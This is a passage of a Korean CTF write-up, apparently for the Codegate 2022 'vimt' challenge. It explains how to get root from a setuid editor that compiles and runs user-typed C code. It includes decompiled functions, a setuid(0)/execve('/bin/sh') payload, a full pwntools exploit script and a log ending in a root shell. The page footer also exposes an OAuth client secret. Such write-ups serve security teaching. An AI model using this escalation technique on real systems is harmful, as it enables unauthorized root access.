+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">setAxis</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> _len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(cmd) &lt;= <span class="number">6</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, len - <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">  v6 = cmd[<span class="number">4</span>];</span><br><span class="line">  _len = <span class="built_in">strlen</span>(cmd);</span><br><span class="line">  <span class="built_in">memcpy</span>(s, cmd + <span class="number">6</span>, _len - <span class="number">6</span>);</span><br><span class="line">  n = atoi(s);</span><br><span class="line">  <span class="keyword">if</span> ( v6 != <span class="string">&#x27;y&#x27;</span> &amp;&amp; v6 != <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">  <span class="keyword">if</span> ( n &gt;= <span class="number">0</span> &amp;&amp; n &lt;= y - <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cur_y = n;</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">free</span>(s);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>compile</code> 함수는 Esc 입력 후 “compile” 커맨드를 처리하는 함수입니다. 17~25행에서 <code>map</code> 의 내용을 <code>tmp/</code> 경로에 <code>.c</code> 확장자를 가진 파일로 저장합니다. 30행에서 <code>system</code> 함수를 호출하여 <code>gcc</code> 를 실행해 저장한 파일을 바이너리로 컴파일하고, 32행에서 성공하면 컴파일된 바이너리를 다시 <code>system</code> 함수로 실행합니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">compile</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  _map = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, (y + <span class="number">1</span>) * (x + <span class="number">1</span>) + <span class="number">1</span>);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; y; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; x; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      _map[idx] = <span class="built_in">map</span>[i][j];</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  hexstring = randomHexString(<span class="number">32</span>);</span><br><span class="line">  hexstring_len = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  c_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, hexstring_len + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(c_file, <span class="string">&quot;tmp/%s.c&quot;</span>, hexstring);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(hexstring);</span><br><span class="line">  exec_file = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v1 + <span class="number">7</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(exec_file, <span class="string">&quot;tmp/%s&quot;</span>, hexstring);</span><br><span class="line">  fd = open(c_file, <span class="number">0x42</span>, <span class="number">420LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(_map);</span><br><span class="line">  write(fd, _map, v2);</span><br><span class="line">  close(fd);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(c_file);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(exec_file);</span><br><span class="line">  cmd = (<span class="type">char</span> *)<span class="built_in">calloc</span>(<span class="number">1uLL</span>, v3 + v5 + <span class="number">9</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;gcc -o %s %s&quot;</span>, exec_file, c_file);</span><br><span class="line">  system(cmd);</span><br><span class="line">  <span class="keyword">if</span> ( !access(exec_file, <span class="number">0</span>) )</span><br><span class="line">    system(exec_file);</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
+<h2 id="%EB%AC%B8%EC%A0%9C-%ED%92%80%EC%9D%B4" tabindex="-1">문제 풀이</h2>
+<p>문제 바이너리에 setuid 권한이 있으므로, 셸을 실행하는 C 소스 코드를 입력한 후 “compile” 커맨드로 컴파일하여 실행하면 root 권한의 셸을 얻을 수 있습니다. 다만  문자를 입력할 때마다 랜덤한 문자 5개가 함께 입력된다는 문제가 있는데, 터미널의 크기를 잘 조정하고 “set y &lt;N&gt;” 커맨드를 적절히 사용하면 원하는 문자열만 입력되도록 할 수 있습니다.</p>
+<p>예를 들어 터미널의 가로 크기가 47일 때, “main()” 문자열을 입력해 보겠습니다. 먼저 첫 번째 문자인 ‘m’ 을 입력한 후 <code>map</code> 배열의 상태를 살펴보겠습니다. 초록색 문자는 입력한 문자, 흰색 문자는 랜덤으로 입력된 문자, 두꺼운 수직 바는 입력 후 커서의 위치를 나타냅니다. 입력한 ‘m’ 은 배열의 <code>map[0][0]</code> 에 저장됩니다.</p>
+<p><img src="/images/codegate22-vimt/2.png" alt="2.png"></p>
+<p>‘m’ 을 한번 더 입력해 보겠습니다. 이전의 입력에서 추가된 랜덤한 5바이트의 문자열로 인해, 이번 ‘m’ 은 배열의 <code>map[0][6]</code> 에 저장됩니다.</p>
+<p><img src="/images/codegate22-vimt/3.png" alt="3.png"></p>
+<p>이와 같이 ‘m’ 을 모두 8번 입력해 보겠습니다. 8번째로 입력한 ‘m’ 은 <code>map[0][42]</code> 에 저장됩니다. 이후 랜덤한 문자열이 추가되는데, 줄바꿈이 일어나 최종적으로 입력 후 커서의 위치가 <code>map[1][1]</code> 이 된 것을 확인할 수 있습니다.</p>
+<p><img src="/images/codegate22-vimt/4.png" alt="4.png"></p>
+<p>이 상태에서 “set y 0” 커맨드를 실행하면, <code>cur_y</code> 전역 변수의 값만 0으로 바뀌면서 커서의 위치가 <code>map[0][1]</code> 로 이동합니다.</p>
+<p><img src="/images/codegate22-vimt/5.png" alt="5.png"></p>
+<p>따라서 입력할 문자열의 두 번째 문자인 ‘a’ 를 입력하면, 의도했던 대로 ‘ma’ 를 입력할 수 있게 됩니다. 즉, 각 문자를 입력할 때마다 8번씩 입력한 후 “set y 0” 을 실행하면 모든 문자를 의도한 위치에 입력할 수 있습니다.</p>
+<p><img src="/images/codegate22-vimt/6.png" alt="6.png"></p>
+<p>이 방법을 사용하여 코드를 작성하기 위해서는 전체 코드에 줄바꿈이 없어야 하고, 코드의 길이가 터미널의 가로 크기인 47바이트보다 짧아야 합니다. 코드의 길이를 줄이기 위해 다음과 같은 <code>gcc</code> 의 트릭을 사용할 수 있습니다.</p>
+<ol>
+<li>함수 리턴 타입을 명시하지 않으면 기본값으로 <code>int</code> 를 반환합니다.</li>
+<li>라이브러리 함수의 헤더를 <code>#include</code> 하지 않아도, 링킹 과정에서 동일한 프로토타입의 함수를 resolve하여 호출할 수 있도록 합니다.</li>
+</ol>
+<p><div class="link-preview-widget"><a href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener external nofollow noreferrer" target="_blank"><div class="link-preview-widget-title">Where does GCC find printf ? My code worked without any #include</div><div class="link-preview-widget-description">I am a C beginner so I tried to hack around the stuff.
+I read stdio.h and I found this line:
+extern int printf (const char *__restrict __format, ...);
+So I wrote this code and i have no idea why it...</div><div class="link-preview-widget-url">Stack Overflow</div></a><a class="link-preview-widget-image" href="https://stackoverflow.com/questions/71759099/where-does-gcc-find-printf-my-code-worked-without-any-include" rel="noopener external nofollow noreferrer" style="background-image: url('https://cdn.sstatic.net/Sites/stackoverflow/Img/apple-touch-icon@2.png?v=73d79a89bded');" target="_blank"></a></div></p>
+<p>다음은 위의 트릭을 사용하여 작성한 셸을 실행하는 41바이트의 C 코드입니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main() &#123;setuid(<span class="number">0</span>);execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="number">0</span>,<span class="number">0</span>);&#125;</span><br></pre></td></tr></table></figure>
+<p>이 코드를 앞서 사용한 8번 입력 후 “set y 0” 커맨드를 실행하는 방법으로 입력한 후 <code>map</code> 배열의 상태는 다음과 같습니다. 커서는 <code>map[0][41]</code> 에 위치하고 있으며, <code>map[0]</code> 의 코드 뒷부분, <code>map[1]</code> 에 거쳐 랜덤한 문자들이 많이 남아있는 상황입니다.</p>
+<p><img src="/images/codegate22-vimt/7.png" alt="7.png"></p>
+<p>그런데 코드의 길이가 정확히 41바이트이므로, 현재 커서 위치에서 아무 문자 하나를 입력한 후(실제로는 6개가 입력됩니다) Backspace를 입력하여 <code>deleteKey</code> 함수를 호출하면 <code>map[0]</code> 의 뒷부분에 위치한 랜덤한 문자는 모두 지울 수 있습니다.</p>
+<p>다음 그림에서 붉은 문자는 입력 후 Backspace에 지워지는 문자들입니다. <code>inputKey</code> 함수에서 줄바꿈은 새로운 문자를 입력받기 전 이전 입력에 대한 <code>cur_x</code> 값의 변화를 기준으로 수행합니다. <code>inputKey</code> 함수가 리턴한 이후 <code>deleteKey</code> 함수 호출 시점에서 커서의 위치는 줄바꿈이 아직 일어나지 않은 <code>map[0][47]</code> 이므로, 랜덤한 문자만 깔끔하게 지울 수 있게 됩니다.</p>
+<p><img src="/images/codegate22-vimt/8.png" alt="8.png"></p>
+<p>이후 “set y 1” 커맨드로 커서의 위치를 <code>map[1][41]</code> 로 옮긴 후, 동일하게 아무 문자 하나를 입력하고 Backspace를 8번 입력하면 <code>map[1]</code> 의 모든 문자를 지울 수 있습니다. 이제 의도했던 대로 정확히 소스 코드만 입력되었습니다. “compile” 커맨드로 바이너리를 컴파일한 후 실행하면 root 권한의 셸을 획득하게 됩니다.</p>
+<p><img src="/images/codegate22-vimt/9.png" alt="9.png"></p>
+<p>다음은 위의 내용을 바탕으로 작성한 익스플로잇 코드입니다. 4행은 <code>sshpass</code> 커맨드로 SSH 접속을 수행하고, 35행은 서버에서 <code>stty</code> 커맨드로 가상 터미널의 가로와 세로 크기를 지정합니다. 입력할 코드를 전송하는 과정에서 순서가 꼬여 실패하는 경우가 있는데, 익스플로잇 코드를 몇 번 실행하면 root 권한의 셸을 획득할 수 있습니다.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;sshpass -e ssh -tt ctf@localhost -p 1234 &#x27;bash -i&#x27;&quot;</span>,</span><br><span class="line">            shell=<span class="literal">True</span>, env=&#123;<span class="string">&quot;SSHPASS&quot;</span>: <span class="string">&quot;ctf1234_smiley&quot;</span>&#125;)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_axis</span>(<span class="params">n</span>):</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;set y &quot;</span> + <span class="built_in">str</span>(n).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">input_key</span>(<span class="params">c</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(p8(c))</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean</span>():</span><br><span class="line">    set_axis(<span class="number">0</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line">    set_axis(<span class="number">1</span>)</span><br><span class="line">    r.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        r.send(<span class="string">b&quot;\x7f&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compile</span>():</span><br><span class="line">    r.send(<span class="string">b&quot;\x1b&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;compile&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;stty cols 47 rows 4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;~$&quot;</span>, <span class="string">b&quot;./app&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;main() &#123;setuid(0);execve(\&quot;/bin/sh\&quot;,0,0);&#125;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload:</span><br><span class="line">        input_key(c)</span><br><span class="line"></span><br><span class="line">    clean()</span><br><span class="line">    <span class="built_in">compile</span>()</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ ./ex.py</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;      \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;                                               \r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;-----------------------------------------------\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;:compiletmp/c7fd17d084a218713d385deb3df85bd1.c:1:1: warning: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      | ^~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c: In function &#x27;main&#x27;:\r\n&quot;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:9: warning: implicit declaration of function &#x27;setuid&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |         ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&quot;tmp/c7fd17d084a218713d385deb3df85bd1.c:1:19: warning: implicit declaration of function &#x27;execve&#x27; [-Wimplicit-function-declaration]\r\n&quot;</span></span><br><span class="line">    b<span class="string">&#x27;    1 | main() &#123;setuid(0);execve(&quot;/bin/sh&quot;,0,0);&#125;\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;      |                   ^~~~~~\r\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;# &#x27;</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="comment"># $ id</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    b<span class="string">&#x27;id\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">[DEBUG] Received 0x2c bytes:</span><br><span class="line">    b<span class="string">&#x27;uid=0(root) gid=1000(ctf) groups=1000(ctf)\r\n&#x27;</span></span><br></pre></td></tr></table></figure>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/03/codegate22-arvm/" rel="prev" title="[Codegate CTF 2022] ARVM">
+                  <i class="fa fa-chevron-left"></i> [Codegate CTF 2022] ARVM
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class=""></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Juhyun Song</span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.1/es5/tex-mml-chtml.js","integrity":"sha256-hlC2uSQYTmPsrzGZTEQEg9PZ1a/+SV6VBCTclohf2og="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"juhyun167","repo":"juhyun167.github.io","client_id":"97ef06bf938b3dfb0c5b","client_secret":"210c90c45a592282824bbc4312dbc74b3709bbea","admin_user":"juhyun167","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"en","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.7.2/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"547064cd467b1170db03b60d2ef4c388"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
